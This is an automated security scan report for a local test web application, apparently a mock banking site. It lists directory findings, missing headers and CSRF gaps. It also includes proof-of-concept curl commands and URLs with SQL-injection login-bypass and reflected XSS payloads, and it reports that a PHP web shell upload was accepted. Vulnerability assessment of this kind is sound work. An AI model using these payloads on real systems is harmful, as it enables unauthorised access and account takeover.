# 0x7v11co Security Assessment Report

**Scan Date:** 2026-04-05 18:23:22

**Total Issues:** 36

## Summary

- **Directory Discovery**: 18 finding(s)
- **Missing Security Header**: 4 finding(s)
- **CSRF Missing**: 5 finding(s)
- **SQL Injection**: 2 finding(s)
- **Reflected XSS**: 5 finding(s)
- **Unrestricted File Upload**: 2 finding(s)

## Detailed Findings

### Directory Discovery

**Severity:** Info

**Description:** Found path: admin (Status: 301)

**URL:** `http://127.0.0.1:8000/admin`

---

**Severity:** Info

**Description:** Found path: logout (Status: 301)

**URL:** `http://127.0.0.1:8000/logout`

---

**Severity:** Info

**Description:** Found path: dashboard (Status: 301)

**URL:** `http://127.0.0.1:8000/dashboard`

---

**Severity:** Info

**Description:** Found path: admin-panel (Status: 301)

**URL:** `http://127.0.0.1:8000/admin-panel`

---

**Severity:** Info

**Description:** Found path: profile (Status: 301)

**URL:** `http://127.0.0.1:8000/profile`

---

**Severity:** Info

**Description:** Found path: search (Status: 301)

**URL:** `http://127.0.0.1:8000/search`

---

**Severity:** Info

**Description:** Found path: transfer (Status: 301)

**URL:** `http://127.0.0.1:8000/transfer`

---

**Severity:** Info

**Description:** Found path: support (Status: 301)

**URL:** `http://127.0.0.1:8000/support`

---

**Severity:** Info

**Description:** Found path: static (Status: 301)

**URL:** `http://127.0.0.1:8000/static`

---

**Severity:** Info

**Description:** Found path: media (Status: 301)

**URL:** `http://127.0.0.1:8000/media`

---

**Severity:** High

**Description:** Found path: backup (Status: 301)

**URL:** `http://127.0.0.1:8000/backup`

---

**Severity:** Info

**Description:** Found path: dev_logs (Status: 301)

**URL:** `http://127.0.0.1:8000/dev_logs`

---

**Severity:** Info

**Description:** Found path: api/v1/internal/users (Status: 301)

**URL:** `http://127.0.0.1:8000/api/v1/internal/users`

---

**Severity:** Info

**Description:** Found path: api/v1/internal/transactions (Status: 301)

**URL:** `http://127.0.0.1:8000/api/v1/internal/transactions`

---

**Severity:** Info

**Description:** Found path: .env.example (Status: 200)

**URL:** `http://127.0.0.1:8000/.env.example`

---

**Severity:** Info

**Description:** Found path: robots.txt (Status: 200)

**URL:** `http://127.0.0.1:8000/robots.txt`

---

**Severity:** Info

**Description:** Found path: sitemap.xml (Status: 200)

**URL:** `http://127.0.0.1:8000/sitemap.xml`

---

**Severity:** Info

**Description:** Found path: database_schema.sql (Status: 200)

**URL:** `http://127.0.0.1:8000/database_schema.sql`

---

### Missing Security Header

**Severity:** Medium

**Description:** The header 'X-Frame-Options' is missing from the response.

**URL:** `http://127.0.0.1:8000/profile/`

---

**Severity:** High

**Description:** The header 'Content-Security-Policy' is missing from the response.

**URL:** `http://127.0.0.1:8000/profile/`

---

**Severity:** High

**Description:** The header 'Strict-Transport-Security' is missing from the response.

**URL:** `http://127.0.0.1:8000/profile/`

---

**Severity:** Low

**Description:** The header 'X-Content-Type-Options' is missing from the response.

**URL:** `http://127.0.0.1:8000/profile/`

---

### CSRF Missing

**Severity:** Medium

**Description:** POST form at http://127.0.0.1:8000/login/ does not have a CSRF protection token. This makes the form vulnerable to Cross-Site Request Forgery attacks.

**URL:** `http://127.0.0.1:8000/login/`

---

**Severity:** Medium

**Description:** POST form at http://127.0.0.1:8000/profile/edit/ does not have a CSRF protection token. This makes the form vulnerable to Cross-Site Request Forgery attacks.

**URL:** `http://127.0.0.1:8000/profile/edit/`

---

**Severity:** Medium

**Description:** POST form at http://127.0.0.1:8000/transfer/ does not have a CSRF protection token. This makes the form vulnerable to Cross-Site Request Forgery attacks.

**URL:** `http://127.0.0.1:8000/transfer/`

---

**Severity:** Medium

**Description:** POST form at http://127.0.0.1:8000/support/ does not have a CSRF protection token. This makes the form vulnerable to Cross-Site Request Forgery attacks.

**URL:** `http://127.0.0.1:8000/support/`

---

**Severity:** Medium

**Description:** POST form at http://127.0.0.1:8000/documents/upload/ does not have a CSRF protection token. This makes the form vulnerable to Cross-Site Request Forgery attacks.

**URL:** `http://127.0.0.1:8000/documents/upload/`

---

### SQL Injection

**Severity:** Critical

**Description:** SQL Injection at http://127.0.0.1:8000/login/ caused authentication bypass. The payload altered the query logic.

**URL:** `http://127.0.0.1:8000/login/`

**PoC:** `curl -X POST -d 'username=%27+OR+%271%27%3D%271%27+--+&password=%27+OR+%271%27%3D%271%27+--+' 'http://127.0.0.1:8000/login/'`

---

**Severity:** Critical

**Description:** SQL Injection at http://127.0.0.1:8000/search/ caused authentication bypass. The payload altered the query logic.

**URL:** `http://127.0.0.1:8000/search/`

**PoC:** `http://127.0.0.1:8000/search/?q=%27+OR+%271%27%3D%271%27+--+`

---

### Reflected XSS

**Severity:** High

**Description:** Payload was reflected in the response from http://127.0.0.1:8000/search/. Context: Generic Reflection

**URL:** `http://127.0.0.1:8000/search/`

**PoC:** `http://127.0.0.1:8000/search/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`

---

**Severity:** High

**Description:** Payload was reflected in the response from http://127.0.0.1:8000/profile/edit/. Context: Generic Reflection

**URL:** `http://127.0.0.1:8000/profile/edit/`

**PoC:** `curl -X POST -d 'bio=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&phone=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&address=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&national_id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&profile_picture=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E' 'http://127.0.0.1:8000/profile/edit/'`

---

**Severity:** High

**Description:** Payload was reflected in the response from http://127.0.0.1:8000/documents/view/. Context: Script Context

**URL:** `http://127.0.0.1:8000/documents/view/`

**PoC:** `http://127.0.0.1:8000/documents/view/?file=-alert%281%29-`

---

**Severity:** High

**Description:** Payload was reflected in the response from http://127.0.0.1:8000/transfer/. Context: Script Context

**URL:** `http://127.0.0.1:8000/transfer/`

**PoC:** `curl -X POST -d 'from_account=-alert%281%29-&to_account_number=-alert%281%29-&amount=-alert%281%29-&description=-alert%281%29-' 'http://127.0.0.1:8000/transfer/'`

---

**Severity:** High

**Description:** Payload was reflected in the response from http://127.0.0.1:8000/support/. Context: Generic Reflection

**URL:** `http://127.0.0.1:8000/support/`

**PoC:** `curl -X POST -d 'subject=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&message=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E' 'http://127.0.0.1:8000/support/'`

---

### Unrestricted File Upload

**Severity:** High

**Description:** Server accepted upload of PHP web shell (test_scan.php). No file type validation detected.

**URL:** `http://127.0.0.1:8000/profile/edit/`

---

**Severity:** High

**Description:** Server accepted upload of PHP web shell (test_scan.php). No file type validation detected.

**URL:** `http://127.0.0.1:8000/documents/upload/`

---

